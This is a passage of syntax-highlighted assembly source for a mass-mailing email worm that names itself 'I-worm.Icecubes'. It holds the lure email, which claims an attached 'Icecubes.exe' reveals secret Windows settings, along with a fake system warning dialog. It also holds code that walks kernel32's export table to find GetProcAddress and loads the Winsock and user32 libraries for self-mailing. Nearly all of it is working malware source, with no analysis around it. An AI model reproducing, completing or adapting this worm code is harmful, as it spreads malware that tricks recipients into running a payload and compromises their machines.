    </span><span class="sc5">AGetFileSize</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ws_send_mail</span><span class="sc0">
    </span><span class="sc5">email_buffer_address</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">email_size</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">datatag</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">emailid</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Message-ID: &lt;a1234&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">emailstart</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: Fw: Windows Icecubes !'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: multipart/mixed; boundary="a1234"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'--a1234'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: text/plain; charset=us-ascii'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: 7bit'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'----- Original Message -----'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;Look at what I found on the web. This tool scans your system for hidden Windows settings.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;These settings, which are better known as the "Windows Icecubes", were built in Windows by'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;the programmers at Microsoft and were supposed to be kept secret. '</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;Just take a look, cause I think you might want to make some changes ;).'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'--a1234'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: application/octet-stream; name="Icecubes.exe"'</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Disposition: attachment; filename="Icecubes.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">emailend</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">emailtail</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'--a1234--'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">endtag</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">      
    </span><span class="sc5">timedate</span><span class="sc0">            </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">AMessageBox</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetSystemTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">msgmessage</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Windows detected icecubes on your harddrive."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"This may cause the system to stop responding."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Do you want Windows to remove all icecubes ?"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">windowtitle</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I-worm.Icecubes / f0re"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc5">ASend</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"send"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ARecv</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"recv"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">recvbuffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;============================[ ic-get_gpa.inc ]=============================;</span><span class="sc0">

</span><span class="sc5">GET_GETPROCADDRESS_API_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    
    </span><span class="sc5">LoadExportTableData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get exporttable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; address from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; kernel's PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">numberofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save number of names</span><span class="sc0">
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to funtion</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; addresses</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; of functions</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to ordinals</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; of functions</span><span class="sc0">

    </span><span class="sc5">BeginProcAddressSearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; search for GetProc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; Address API in names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">        

    </span><span class="sc5">TryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    

    </span><span class="sc5">MatchByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextOne</span><span class="sc0">                 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; did the entire string</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GotIt</span><span class="sc0">                    </span><span class="sc1">; match ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MatchByte</span><span class="sc0">

    </span><span class="sc5">NextOne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; get next namepointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; in table (4 dwords)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; align with kernelbase</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TryAgain</span><span class="sc0">

    </span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ordinal = nameindex *</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; size of ordinal entry</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; + ordinal table base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; address of function =</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ordinal * size of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; entry of address </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; table + base of </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; addresstable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">; save GPA address</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
  
</span><span class="sc5">GET_GETPROCADDRESS_API_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===========================[ ic-get_bases.inc ]============================;</span><span class="sc0">

</span><span class="sc5">GET_WSOCK32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">LoadWsock32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; not found, then</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; load the dll</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; first</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_WSOCK32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GET_USER32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetUser32Base</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32</span><span class="sc4">]</span><span class="sc0">             
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">           
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">                 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_USER32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;============================[ ic-get_api.inc ]=============================;</span><span class="sc0">

</span><span class="sc5">GETAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load kernelbase</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; call the api</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; return</span><span class="sc0">
     
</span><span class="sc5">GETAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETUAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; load wsockbase</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GETUAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETWAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32address</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load wsockbase</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GETWAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;==========================[ ic-directory.inc ]=============================;</span><span class="sc0">
    
</span><span class="sc5">GET_WINDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetWindowsDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0">                   </span><span class="sc1">; size of dirstring     </span><span class="sc0">
